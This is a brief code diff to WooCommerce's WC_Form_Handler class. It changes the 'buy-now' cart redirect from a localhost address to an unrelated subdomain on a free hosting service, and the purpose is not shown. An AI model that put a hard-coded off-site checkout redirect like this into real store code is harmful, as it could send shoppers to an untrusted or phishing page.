@@ -809,7 +809,7 @@ class WC_Form_Handler {
 
 		if ($_REQUEST['add-to-cart'] == 'buy-now') {
 
-            wp_redirect('http://localhost:6060/cart/');
+            wp_redirect('https://idfnwvjv.nethost-1511.000nethost.com/?page_id=7');
             die();
         }
 	}
